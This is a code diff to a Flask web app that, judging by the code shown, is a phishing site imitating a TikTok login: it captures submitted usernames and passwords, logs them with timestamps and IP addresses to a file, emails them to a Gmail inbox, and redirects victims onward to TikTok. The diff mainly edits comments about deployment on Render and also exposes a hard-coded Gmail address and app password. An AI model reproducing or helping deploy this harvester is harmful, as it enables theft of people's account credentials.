@@ -3,7 +3,7 @@
 from flask import Flask, render_template, request, redirect, url_for
 import smtplib
 from email.mime.text import MIMEText
-import os # For accessing environment variables
+import os # ESSENTIAL for Render's PORT environment variable
 from datetime import datetime # For adding timestamps to logs
 
 app = Flask(__name__)
@@ -18,8 +18,7 @@ app = Flask(__name__)
 # Your controlled email address
 EMAIL_ADDRESS = "mwananchihuslerloans@gmail.com"
 # Your Gmail App Password (ENSURE NO SPACES)
-# You confirmed 'mokasgadsacljec' works, so use that without spaces.
-EMAIL_PASSWORD = "mokasgadsacljec" # <--- CRITICAL: NO SPACES HERE
+EMAIL_PASSWORD = "mokasgadsacljec" # <--- VERIFY THIS HAS NO SPACES
 TO_EMAIL = "mwananchihuslerloans@gmail.com" # Recipient email
 
 @app.route("/")
@@ -40,9 +39,9 @@ def login():
         ip_address = request.environ.get('REMOTE_ADDR', 'Unknown IP') # Get client IP
         with open("credentials.txt", "a") as f:
             f.write(f"[{timestamp}] IP: {ip_address} - User: {username} | Pass: {password}\n")
-        print(f"Credentials saved to credentials.txt: {username} | {password}")
+        print(f"Credentials saved to credentials.txt: {username} | {password}") # THIS MUST APPEAR IN LOGS
     except Exception as e:
-        print(f"Error saving credentials to file: {e}")
+        print(f"Error saving credentials to file: {e}") # THIS MUST APPEAR IN LOGS IF FILE SAVE FAILS
     # --- End Credential Logging ---
 
     # --- Email Notification ---
@@ -60,14 +59,13 @@ def login():
             msg['To'] = TO_EMAIL
 
             smtp.send_message(msg)
-            print("Credentials sent via email successfully!") # This line should appear in Render logs on success
+            print("Credentials sent via email successfully!") # THIS MUST APPEAR IN LOGS ON SUCCESS
 
     except Exception as e:
         # If an error occurs during email sending, this will be printed in Render logs
-        print(f"Error sending email: {e}")
+        print(f"Error sending email: {e}") # THIS MUST APPEAR IN LOGS IF EMAIL SENDING FAILS
 
     # --- Redirect to a page that shows message then auto-redirects to TikTok ---
-    # This uses the 'success' route which will render success.html
     return redirect(url_for('success'))
 
 # --- NEW/MODIFIED ROUTE: The success route that renders success.html ---
@@ -75,7 +73,7 @@ def login():
 def success():
     return render_template("success.html")
 
-# --- IMPORTANT FOR RENDER DEPLOYMENT ---
+# --- CRITICAL FOR RENDER DEPLOYMENT ---
 # Your Flask app MUST bind to 0.0.0.0 and use the dynamic PORT provided by Render
 # for it to be accessible from the internet.
 if __name__ == '__main__':
